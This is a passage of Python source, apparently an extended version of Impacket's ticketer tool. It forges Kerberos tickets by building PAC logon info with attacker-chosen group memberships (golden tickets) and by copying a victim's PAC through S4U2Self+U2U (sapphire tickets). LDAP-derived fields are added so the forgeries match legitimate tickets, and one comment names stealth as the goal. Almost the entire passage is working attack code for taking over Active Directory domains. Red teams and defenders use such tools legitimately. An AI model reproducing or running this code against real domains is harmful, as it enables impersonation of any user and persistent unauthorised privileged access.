            logging.info('  HomeDirectoryDrive: %s' % kerbdata['HomeDirectoryDrive'])
            logging.info('  LogonCount: %d' % kerbdata['LogonCount'])
            logging.info('  BadPasswordCount: %d' % kerbdata['BadPasswordCount'])
            logging.info('  UserId: %d' % kerbdata['UserId'])
            
        else:
            # Use default values as before
            aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
            unixTime = self.getFileTime(aTime)

            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32
            
            kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
            kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32

            kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
            kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
            
            kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
            kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

            kerbdata['EffectiveName'] = self.__target
            kerbdata['FullName'] = ''
            kerbdata['LogonScript'] = ''
            kerbdata['ProfilePath'] = ''
            kerbdata['HomeDirectory'] = ''
            kerbdata['HomeDirectoryDrive'] = ''
            kerbdata['LogonCount'] = 500
            kerbdata['BadPasswordCount'] = 0
            kerbdata['UserId'] = int(self.__options.user_id)

        # Common fields for both cases
        # LogoffTime and KickOffTime always set to "never"
        kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF
        kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF

        # Our Golden Well-known groups! :)
        groups = self.__options.groups.split(',')
        if len(groups) == 0:
            # PrimaryGroupId must be set, default to 513 (Domain User)
            kerbdata['PrimaryGroupId'] = 513
        else:
            # Using first group as primary group
            kerbdata['PrimaryGroupId'] = int(groups[0])
        kerbdata['GroupCount'] = len(groups)

        for group in groups:
            groupMembership = GROUP_MEMBERSHIP()
            groupId = NDRULONG()
            groupId['Data'] = int(group)
            groupMembership['RelativeId'] = groupId
            groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['GroupIds'].append(groupMembership)

        kerbdata['UserFlags'] = 0
        # User Session Key - from LDAP or default
        if self.__options.ldap and self.__user_info and 'userSessionKey' in self.__user_info:
            kerbdata['UserSessionKey'] = self.__user_info['userSessionKey']
        else:
            kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        
        # Logon Server - try to get real DC name or use provided DC IP
        if self.__options.ldap and self.__user_info and 'logonServer' in self.__user_info:
            kerbdata['LogonServer'] = self.__user_info['logonServer']
        elif self.__options.dc_ip:
            # Try to get hostname from DC IP
            try:
                import socket
                hostname = socket.gethostbyaddr(self.__options.dc_ip)[0]
                # Remove domain suffix if present
                if '.' in hostname:
                    hostname = hostname.split('.')[0]
                kerbdata['LogonServer'] = hostname
                logging.info('Resolved DC hostname: %s' % hostname)
            except:
                # If reverse DNS fails, use DC IP as fallback
                kerbdata['LogonServer'] = self.__options.dc_ip
                logging.info('Using DC IP as logon server: %s' % self.__options.dc_ip)
        else:
            # Try to get DC name from domain
            try:
                import socket
                # Query domain for DC
                dc_name = socket.gethostbyname_ex(self.__domain)[0]
                if '.' in dc_name:
                    dc_name = dc_name.split('.')[0]
                kerbdata['LogonServer'] = dc_name
                logging.info('Resolved DC name from domain: %s' % dc_name)
            except:
                kerbdata['LogonServer'] = 'DC'  # Default fallback
                logging.info('Using default logon server name: DC')
        
        # Logon Domain Name - from LDAP or extract short name from domain
        if self.__options.ldap and self.__user_info and 'logonDomainName' in self.__user_info:
            kerbdata['LogonDomainName'] = self.__user_info['logonDomainName']
        else:
            # Extract short domain name (first part before dot)
            domain_parts = self.__domain.upper().split('.')
            if len(domain_parts) > 1:
                # Use first part as short domain name (e.g., CORP.GOODS.RU -> CORP)
                kerbdata['LogonDomainName'] = domain_parts[0]
                logging.info('Using short domain name: %s' % kerbdata['LogonDomainName'])
            else:
                # If no dots, use full domain name
                kerbdata['LogonDomainName'] = self.__domain.upper()
                logging.info('Using full domain name: %s' % kerbdata['LogonDomainName'])
        
        kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
        
        # LM Key - from LDAP or default
        if self.__options.ldap and self.__user_info and 'lmKey' in self.__user_info:
            kerbdata['LMKey'] = self.__user_info['lmKey']
        else:
            kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        
        # SubAuth Status - from LDAP or default
        if self.__options.ldap and self.__user_info and 'subAuthStatus' in self.__user_info:
            kerbdata['SubAuthStatus'] = self.__user_info['subAuthStatus']
        else:
            kerbdata['SubAuthStatus'] = 0
        
        # Last Successful Interactive Logon - from LDAP or default
        if self.__options.ldap and self.__user_info and 'lastSuccessfulInteractiveLogon' in self.__user_info:
            lastSuccess = self.__user_info['lastSuccessfulInteractiveLogon']
            kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = lastSuccess & 0xffffffff
            kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = lastSuccess >> 32
        else:
            kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
            kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        
        # Last Failed Interactive Logon - from LDAP or default
        if self.__options.ldap and self.__user_info and 'lastFailedInteractiveLogon' in self.__user_info:
            lastFailed = self.__user_info['lastFailedInteractiveLogon']
            kerbdata['LastFailedILogon']['dwLowDateTime'] = lastFailed & 0xffffffff
            kerbdata['LastFailedILogon']['dwHighDateTime'] = lastFailed >> 32
        else:
            kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
            kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
        
        # Failed Interactive Logon Count - from LDAP or default
        if self.__options.ldap and self.__user_info and 'failedInteractiveLogonCount' in self.__user_info:
            kerbdata['FailedILogonCount'] = self.__user_info['failedInteractiveLogonCount']
        else:
            kerbdata['FailedILogonCount'] = 0
        
        # Reserved3 - from LDAP or default
        if self.__options.ldap and self.__user_info and 'reserved3' in self.__user_info:
            kerbdata['Reserved3'] = self.__user_info['reserved3']
        else:
            kerbdata['Reserved3'] = 0

        kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        kerbdata['ResourceGroupIds'] = NULL

        validationInfo = VALIDATION_INFO()
        validationInfo['Data'] = kerbdata

        return validationInfo

    def createBasicPac(self, kdcRep):
        validationInfo = self.createBasicValidationInfo()
        pacInfos = {}
        pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()
        srvCheckSum = PAC_SIGNATURE_DATA()
        privCheckSum = PAC_SIGNATURE_DATA()

        if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:
            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
            privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
            srvCheckSum['Signature'] = b'\x00' * 16
            privCheckSum['Signature'] = b'\x00' * 16
        else:
            srvCheckSum['Signature'] = b'\x00' * 12
            privCheckSum['Signature'] = b'\x00' * 12
            if len(self.__options.aesKey) == 64:
                srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
                privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
            else:
                srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value
                privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value

        pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()
        pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()

        clientInfo = PAC_CLIENT_INFO()
        clientInfo['Name'] = self.__target.encode('utf-16le')
        clientInfo['NameLength'] = len(clientInfo['Name'])
        pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()

        # Always create UPN DNS info to match legitimate tickets
        # This ensures the ticket structure matches real tickets
        self.createUpnDnsPac(pacInfos)

        if self.__options.old_pac is False:
            self.createAttributesInfoPac(pacInfos)
            self.createRequestorInfoPac(pacInfos)

        return pacInfos

    def createUpnDnsPac(self, pacInfos):
        upnDnsInfo = UPN_DNS_INFO_FULL()

        PAC_pad = b'\x00' * self.getPadLength(len(upnDnsInfo))
        
        # Use UPN from LDAP if available, else construct
        if self.__options.ldap and self.__user_info and 'userPrincipalName' in self.__user_info:
            upn_string = self.__user_info['userPrincipalName'].lower()
            sam_name = self.__user_info.get('sAMAccountName', self.__target)
            logging.info('Using LDAP UPN: %s' % upn_string)
        else:
            upn_string = f"{self.__target.lower()}@{self.__domain.lower()}"
            sam_name = self.__target
            
        upn_data = upn_string.encode("utf-16-le")
        upnDnsInfo['UpnLength'] = len(upn_data)
        upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)
        total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']
        pad = self.getPadLength(total_len)
        upn_data += b'\x00' * pad

        dns_name = self.__domain.upper().encode("utf-16-le")
        upnDnsInfo['DnsDomainNameLength'] = len(dns_name)
        upnDnsInfo['DnsDomainNameOffset'] = total_len + pad
        total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']
        pad = self.getPadLength(total_len)
        dns_name += b'\x00' * pad

        # Determine the correct UPN DNS flags based on content
        # U_UsernameOnly (1) = only UPN and DNS domain name
        # S_SidSamSupplied (2) = UPN, DNS domain name, SAM name, and SID
        # Since we're including SAM name and SID, we should use S_SidSamSupplied
        # Check if we have LDAP data and user SID information
        if (self.__options.ldap and self.__user_info and 
            'objectSid' in self.__user_info and sam_name):
            upnDnsInfo['Flags'] = 2  # S_SidSamSupplied - includes SAM name and SID
            flag_description = "S_SidSamSupplied"
        else:
            upnDnsInfo['Flags'] = 1  # U_UsernameOnly - only UPN and DNS domain
            flag_description = "U_UsernameOnly"
        
        logging.info('UPN DNS Info - Flags: %d (%s), UPN: %s, DNS Domain: %s, SAM: %s' % 
                    (upnDnsInfo['Flags'], flag_description, upn_string, self.__domain.upper(), sam_name))

        samName = sam_name.encode("utf-16-le")
        upnDnsInfo['SamNameLength'] = len(samName)
        upnDnsInfo['SamNameOffset'] = total_len + pad
        total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']
        pad = self.getPadLength(total_len)
        samName += b'\x00' * pad

        # Use real User ID from LDAP
        user_id = self.__user_info.get('rid', int(self.__options.user_id)) if (self.__options.ldap and self.__user_info) else int(self.__options.user_id)
        user_sid = SID()
        user_sid.fromCanonical(f"{self.__options.domain_sid}-{user_id}")
        upnDnsInfo['SidLength'] = len(user_sid)
        upnDnsInfo['SidOffset'] = total_len + pad
        total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']
        pad = self.getPadLength(total_len)
        user_data = user_sid.getData() + b'\x00' * pad

        # Post-PAC data
        post_pac_data = upn_data + dns_name + samName + user_data
        # Pac data building
        pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data

    @staticmethod
    def createAttributesInfoPac(pacInfos):
        pacAttributes = PAC_ATTRIBUTE_INFO()
        pacAttributes["FlagsLength"] = 2
        pacAttributes["Flags"] = 1

        pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()

    def createRequestorInfoPac(self, pacInfos):
        pacRequestor = PAC_REQUESTOR()
        pacRequestor['UserSid'] = SID()
        
        # Use real User ID from LDAP
        user_id = self.__user_info.get('rid', int(self.__options.user_id)) if (self.__options.ldap and self.__user_info) else int(self.__options.user_id)
        pacRequestor['UserSid'].fromCanonical(f"{self.__options.domain_sid}-{user_id}")

        pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()

    def createBasicTicket(self):
        if self.__options.request is True:
            # Connect to LDAP and SYSVOL to retrieve information (only with -ldap flag)
            if self.__options.ldap:
                logging.info('LDAP flag enabled - gathering information from Active Directory...')
                self.connectToLDAP()
                self.connectToSYSVOL()
                
                # Update ticket parameters with retrieved information
                self.updateTicketWithLDAPInfo()
            else:
                logging.info('Using provided parameters (use -ldap flag to gather info from AD)')
            
            if self.__domain == self.__server:
                logging.info('Requesting TGT to target domain to use as basis')
            else:
                logging.info('Requesting TGT/TGS to target domain to use as basis')

            if self.__options.hashes is not None:
                lmhash, nthash = self.__options.hashes.split(':')
            else:
                lmhash = ''
                nthash = ''
            userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(lmhash), unhexlify(nthash), None,
                                                                    self.__options.dc_ip)
            self.__tgt, self.__tgt_cipher, self.__tgt_session_key = tgt, cipher, sessionKey
            if self.__domain == self.__server:
                kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            else:
                serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)
                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, None, tgt, cipher,
                                                                        sessionKey)
                kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            # Let's check we have all the necessary data based on the ciphers used. Boring checks
            ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
            encPartCipher = int(kdcRep['enc-part']['etype'])

            if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and \
                            self.__options.nthash is None:
                logging.critical('rc4_hmac is used in this ticket and you haven\'t specified the -nthash parameter. '
                                 'Can\'t continue ( or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or
                encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and \
                self.__options.aesKey is None:
                logging.critical(
                    'aes128_cts_hmac_sha1_96 is used in this ticket and you haven\'t specified the -aesKey parameter. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or
                encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and \
                self.__options.aesKey is not None and len(self.__options.aesKey) > 32:
                logging.critical(
                    'aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or
                 encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:
                logging.critical(
                    'aes256_cts_hmac_sha1_96 is used in this ticket and you haven\'t specified the -aesKey parameter. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if ( ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or
                 encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and \
                 self.__options.aesKey is not None and len(self.__options.aesKey) < 64:
                logging.critical(
                    'aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. '
                    'Can\'t continue')
                return None, None
            kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            kdcRep['cname']['name-string'] = noValue
            kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target

        else:
            logging.info('Creating basic skeleton ticket and PAC Infos')
            if self.__domain == self.__server:
                kdcRep = AS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
            else:
                kdcRep = TGS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value
            kdcRep['pvno'] = 5
            if self.__options.nthash is None:
                kdcRep['padata'] = noValue
                kdcRep['padata'][0] = noValue
                kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value

                etype2 = ETYPE_INFO2()
                etype2[0] = noValue
                if len(self.__options.aesKey) == 64:
                    etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                else:
                    etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
                etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)
                encodedEtype2 = encoder.encode(etype2)

                kdcRep['padata'][0]['padata-value'] = encodedEtype2

            kdcRep['crealm'] = self.__domain.upper()
            kdcRep['cname'] = noValue
            kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            kdcRep['cname']['name-string'] = noValue
            kdcRep['cname']['name-string'][0] = self.__target

            kdcRep['ticket'] = noValue
            kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value
            kdcRep['ticket']['realm'] = self.__domain.upper()
            kdcRep['ticket']['sname'] = noValue
            kdcRep['ticket']['sname']['name-string'] = noValue
            kdcRep['ticket']['sname']['name-string'][0] = self.__service

            if self.__domain == self.__server:
                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
                kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()
            else:
                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
                kdcRep['ticket']['sname']['name-string'][1] = self.__server

            kdcRep['ticket']['enc-part'] = noValue
            kdcRep['ticket']['enc-part']['kvno'] = 2
            kdcRep['enc-part'] = noValue
            if self.__options.nthash is None:
                if len(self.__options.aesKey) == 64:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                else:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
            else:
                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value
                kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value

            kdcRep['enc-part']['kvno'] = 2
            kdcRep['enc-part']['cipher'] = noValue

        pacInfos = self.createBasicPac(kdcRep)

        return kdcRep, pacInfos


    def getKerberosS4U2SelfU2U(self):
        tgt = self.__tgt
        cipher = self.__tgt_cipher
        sessionKey = self.__tgt_session_key
        kdcHost = self.__options.dc_ip

        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('S4UByteArray')
            hexdump(S4UByteArray)

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('CheckSum')
            hexdump(checkSum)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = self.__domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('PA_FOR_USER_ENC')
            print(paForUserEnc.prettyPrint())

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.renewable_ok.value)
        opts.append(constants.KDCOptions.enc_tkt_in_skey.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        message = encoder.encode(tgsReq)
        r = sendReceive(message, self.__domain, kdcHost)
        return r, None, sessionKey, None


    def customizeTicket(self, kdcRep, pacInfos):
        logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))

        # Get ticket duration from domain policy
        max_ticket_hours = self.getTicketDuration()
        ticketDuration = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=max_ticket_hours)

        if self.__options.impersonate:
            # Doing Sapphire Ticket
            # todo : in its actual form, ticketer is limited to the PAC structures that are supported in impacket.
            #  Unsupported structures will be ignored. The PAC is not completely copy-pasted here.

            # 1. S4U2Self + U2U
            logging.info('\tRequesting S4U2self+U2U to obtain %s\'s PAC' % self.__options.impersonate)
            tgs, cipher, oldSessionKey, sessionKey = self.getKerberosS4U2SelfU2U()

            # 2. extract PAC
            logging.info('\tDecrypting ticket & extracting PAC')
            decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
            cipherText = decodedTicket['ticket']['enc-part']['cipher']
            newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]
            plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

            # Let's extend the ticket's validity a lil bit
            # I don't think this part should be left in the code. The whole point of doing a sapphire ticket is stealth, extending ticket duration is not the way to go
            # encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
            # encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)

            # Opening PAC
            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
            pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
            pacInfos = dict()
            buff = pacType['Buffers']

            # clearing the signatures so that we can sign&encrypt later on
            AttributesInfoPacInS4UU2UPAC = False
            RequestorInfoPacInS4UU2UPAC = False
            logging.info("\tClearing signatures")
            for bufferN in range(pacType['cBuffers']):
                infoBuffer = pac.PAC_INFO_BUFFER(buff)
                data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]
                buff = buff[len(infoBuffer):]
                if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:
                    checksum = PAC_SIGNATURE_DATA(data)
                    if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                        checksum['Signature'] = '\x00' * 12
                    elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                        checksum['Signature'] = '\x00' * 12
                    else:
                        checksum['Signature'] = '\x00' * 16
                    pacInfos[infoBuffer['ulType']] = checksum.getData()
                elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:
                    AttributesInfoPacInS4UU2UPAC = True
                    pacInfos[infoBuffer['ulType']] = data
                elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:
                    RequestorInfoPacInS4UU2UPAC = True
                    pacInfos[infoBuffer['ulType']] = data
                else:
                    pacInfos[infoBuffer['ulType']] = data

            # adding the Requestor and Attributes structures manually if they were not in the S4U2self+U2U ticket's PAC
            if self.__options.old_pac is False and not AttributesInfoPacInS4UU2UPAC:
                self.createAttributesInfoPac(pacInfos)
            if self.__options.old_pac is False and not RequestorInfoPacInS4UU2UPAC:
                if self.__options.user_id == "500":
                    logging.warning("User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. "
                        "If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id "
                        "with the RID of the target user to impersonate")
                self.createRequestorInfoPac(pacInfos)

            # changing ticket flags to match TGT / ST
            logging.info("\tAdding necessary ticket flags")
            originalFlags = [i for i, x in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']
            flags = originalFlags
            newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]
            if self.__domain == self.__server:
                newFlags.append(TicketFlags.initial.value)
            for newFlag in newFlags:
                if newFlag not in originalFlags:
                    flags.append(newFlag)
            encTicketPart['flags'] = encodeFlags(flags)

            # changing key type to match what the TGT we obtained
            logging.info("\tChanging keytype")
            encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']
            if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
            elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
            else:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])

        else:
            encTicketPart = EncTicketPart()

            flags = list()
            flags.append(TicketFlags.forwardable.value)
            flags.append(TicketFlags.proxiable.value)
            flags.append(TicketFlags.renewable.value)
            if self.__domain == self.__server:
                flags.append(TicketFlags.initial.value)
            flags.append(TicketFlags.pre_authent.value)
            encTicketPart['flags'] = encodeFlags(flags)
            encTicketPart['key'] = noValue
            encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']

            if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
            elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
            else:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])

            encTicketPart['crealm'] = self.__domain.upper()
            encTicketPart['cname'] = noValue
            encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            encTicketPart['cname']['name-string'] = noValue
            encTicketPart['cname']['name-string'][0] = self.__target

            encTicketPart['transited'] = noValue
            encTicketPart['transited']['tr-type'] = 0
            encTicketPart['transited']['contents'] = ''
            encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
            encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
            # Let's extend the ticket's validity a lil bit
            encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
            encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
            encTicketPart['authorization-data'] = noValue
            encTicketPart['authorization-data'][0] = noValue
            encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
